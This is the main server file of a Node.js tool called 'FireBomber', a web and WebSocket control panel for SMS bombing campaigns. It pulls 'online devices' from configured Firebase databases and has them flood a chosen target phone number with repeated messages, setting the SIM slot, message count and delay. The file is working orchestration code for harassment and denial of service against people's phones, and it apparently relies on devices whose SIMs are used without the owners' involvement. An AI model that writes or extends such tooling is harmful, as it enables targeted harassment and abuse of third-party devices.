const express = require('express');
const cors = require('cors');
const path = require('path');
const { WebSocketServer } = require('ws');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ============ MODULES ============
const FirebaseManager = require('./src/firebase/manager');
const SMSDispatcher = require('./src/bomber/dispatcher');
const logger = require('./src/utils/logger');

// ============ STATE ============
const state = {
  databases: [],
  devices: {},
  bombing: {
    active: false,
    targetNumber: '',
    messageTemplate: '',
    simSlot: 1,
    totalDevices: 0,
    onlineDevices: 0,
    sent: 0,
    failed: 0,
    progress: 0,
    logs: []
  }
};

// ============ LOAD CONFIG ============
function loadDatabases() {
  try {
    const config = JSON.parse(fs.readFileSync('./config/databases.json', 'utf8'));
    state.databases = config.databases || [];
    logger.info(`Loaded ${state.databases.length} Firebase databases`);
    return state.databases;
  } catch (err) {
    logger.error('Failed to load databases config:', err.message);
    return [];
  }
}

loadDatabases();

// ============ FIREBASE MANAGER ============
const firebaseManager = new FirebaseManager(state.databases);

// ============ SMS DISPATCHER ============
const dispatcher = new SMSDispatcher(firebaseManager, state);

// ============ WEB SOCKET SERVER ============
const wss = new WebSocketServer({ port: 8080 });

wss.on('connection', (ws) => {
  logger.info('WebSocket client connected');
  ws.send(JSON.stringify({ type: 'state', data: state }));

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      handleWebSocketMessage(data, ws);
    } catch (err) {
      logger.error('WebSocket message error:', err.message);
    }
  });

  ws.on('close', () => logger.info('WebSocket client disconnected'));
});

function broadcastState() {
  const message = JSON.stringify({ type: 'state', data: state });
  wss.clients.forEach((client) => {
    if (client.readyState === client.OPEN) client.send(message);
  });
}

function broadcastLog(message) {
  const logEntry = { timestamp: new Date().toISOString(), message };
  state.bombing.logs.push(logEntry);
  if (state.bombing.logs.length > 1000) state.bombing.logs.shift();

  wss.clients.forEach((client) => {
    if (client.readyState === client.OPEN) {
      client.send(JSON.stringify({ type: 'log', data: logEntry }));
    }
  });
}

// ============ WEBSOCKET HANDLERS ============
function handleWebSocketMessage(data, ws) {
  switch (data.action) {
    case 'startBombing': startBombing(data.payload); break;
    case 'stopBombing': stopBombing(); break;
    case 'refreshDevices': refreshDevices(); break;
    case 'addDatabase': addDatabase(data.payload); break;
    case 'removeDatabase': removeDatabase(data.payload); break;
    case 'testDatabase': testDatabase(data.payload); break;
  }
}

// ============ BOMBING LOGIC ============
async function startBombing(payload) {
  if (state.bombing.active) {
    broadcastLog('⚠️ Bombing already in progress');
    return;
  }

  const { targetNumber, messageTemplate, simSlot = 1, messageCount = 1, delay = 500 } = payload;

  if (!targetNumber || !messageTemplate) {
    broadcastLog('❌ Target number and message template required');
    return;
  }

  state.bombing.active = true;
  state.bombing.targetNumber = targetNumber;
  state.bombing.messageTemplate = messageTemplate;
  state.bombing.simSlot = simSlot;
  state.bombing.sent = 0;
  state.bombing.failed = 0;
  state.bombing.progress = 0;
  state.bombing.logs = [];

  broadcastLog(`🔥 Starting bombing campaign to ${targetNumber}`);
  broadcastLog(`📝 Message: ${messageTemplate.substring(0, 50)}...`);

  const onlineDevices = getOnlineDevices();
  if (onlineDevices.length === 0) {
    broadcastLog('❌ No online devices available');
    state.bombing.active = false;
    broadcastState();
    return;
  }

  broadcastLog(`✅ Found ${onlineDevices.length} online devices`);

  await dispatcher.startBombing(onlineDevices, {
    targetNumber,
    messageTemplate,
    simSlot,
    messageCount,
    delay,
    onProgress: (sent, failed, total) => {
      state.bombing.sent = sent;
      state.bombing.failed = failed;
      state.bombing.progress = total > 0 ? Math.round((sent + failed) / total * 100) : 0;
      broadcastState();
    },
    onLog: (msg) => broadcastLog(msg),
    onComplete: () => {
      state.bombing.active = false;
      broadcastLog('✅ Bombing campaign completed');
      broadcastState();
    }
  });

  broadcastState();
}

function stopBombing() {
  if (!state.bombing.active) {
    broadcastLog('⚠️ No bombing in progress');
    return;
  }
  dispatcher.stop();
  state.bombing.active = false;
  broadcastLog('⏹️ Bombing stopped by user');
  broadcastState();
}

function getOnlineDevices() {
  const online = [];
  for (const dbId in state.devices) {
    const dbDevices = state.devices[dbId] || {};
    for (const deviceId in dbDevices) {
      if (dbDevices[deviceId].status === true) {
        online.push({ dbId, deviceId, device: dbDevices[deviceId] });
      }
    }
  }
  return online;
}

async function refreshDevices() {
  broadcastLog('🔄 Refreshing devices...');
  try {
    const devices = await firebaseManager.getAllDevices();
    state.devices = devices;
    state.bombing.onlineDevices = getOnlineDevices().length;
    broadcastLog(`✅ Found ${getOnlineDevices().length} online devices`);
    broadcastState();
  } catch (err) {
    broadcastLog(`❌ Error refreshing devices: ${err.message}`);
  }
}

async function addDatabase(payload) {
  const { url, authKey, name } = payload;
  if (!url || !authKey) {
    broadcastLog('❌ Database URL and Auth Key required');
    return;
  }

  try {
    const dbId = uuidv4();
    const newDb = {
      id: dbId,
      name: name || url.replace(/https?:\/\//, '').split('.')[0],
      url,
      authKey,
      online: false
    };

    const testResult = await firebaseManager.testDatabase(newDb);
    if (testResult.online) {
      state.databases.push(newDb);
      await firebaseManager.addDatabase(newDb);
      broadcastLog(`✅ Database "${newDb.name}" added successfully`);
      refreshDevices();
    } else {
      broadcastLog(`❌ Database "${newDb.name}" failed to connect: ${testResult.error}`);
    }
  } catch (err) {
    broadcastLog(`❌ Error adding database: ${err.message}`);
  }
}

function removeDatabase(payload) {
  const { dbId } = payload;
  state.databases = state.databases.filter(db => db.id !== dbId);
  firebaseManager.removeDatabase(dbId);
  broadcastLog('🗑️ Database removed');
  refreshDevices();
}

async function testDatabase(payload) {
  const { url, authKey } = payload;
  try {
    const result = await firebaseManager.testDatabase({ url, authKey });
    const ws = wss.clients.values().next().value;
    if (ws) {
      ws.send(JSON.stringify({ type: 'dbTestResult', data: result }));
    }
  } catch (err) {}
}

// ============ INIT ============
refreshDevices();

// ============ API ROUTES ============
app.get('/api/state', (req, res) => res.json(state));
app.get('/api/databases', (req, res) => res.json(state.databases));
app.get('/api/devices', (req, res) => res.json(state.devices));

// ============ START SERVER ============
app.listen(PORT, () => {
  logger.info(`🚀 FireBomber server running on http://localhost:${PORT}`);
  logger.info(`🔌 WebSocket server running on ws://localhost:8080`);
});

process.on('SIGINT', () => {
  logger.info('Shutting down...');
  if (state.bombing.active) dispatcher.stop();
  process.exit(0);
});